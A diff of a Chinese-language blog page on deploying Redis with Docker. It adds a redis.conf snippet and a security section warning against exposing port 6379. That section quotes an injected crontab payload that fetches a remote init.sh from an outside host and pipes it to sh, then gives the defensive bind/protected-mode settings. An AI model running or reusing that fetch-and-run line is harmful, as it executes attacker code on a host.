@@ -123,7 +123,9 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
 </span></span><span style="display:flex;"><span>rm -r /usr/src/redis;
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># ...end</span>
-</span></span></code></pre></div><h2 id="yaml">yaml</h2>
+</span></span></code></pre></div><h2 id="redisconf">redis.conf</h2>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">dir /data; 預設 /etc 無權限
+</code></pre><h2 id="yaml">yaml</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">redis</span>:
@@ -144,7 +146,15 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
 </span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">6379</span>:<span style="color:#ae81ff">6379</span>
-</span></span></code></pre></div>
+</span></span></code></pre></div><h1 id="資安">資安</h1>
+<p>假如是裝在 vps 上要記得避免 6379 對外出去，因為有人會去攻擊塞入 cache 執行 shell 指令，例如在 log 中看到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Failed opening the RDB file root (in server root dir /etc/crontabs) for saving: Permission denied
+</span></span></code></pre></div><p>這種 log 時進入 <code>redis-cli</code> 會發現你的 db0 被塞了四個 key: backup4~backup1，內容是類似</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#e6db74">&#34;\n\n\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n&#34;</span>
+</span></span></code></pre></div><p>這種意圖修改 crontab 去執行 sh 的情況，具體設定如下</p>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">bind 127.0.0.1
+protected-mode yes # 確保來源都是 loopback interface
+</code></pre>
   </section>
   <div class="clearfix">
     
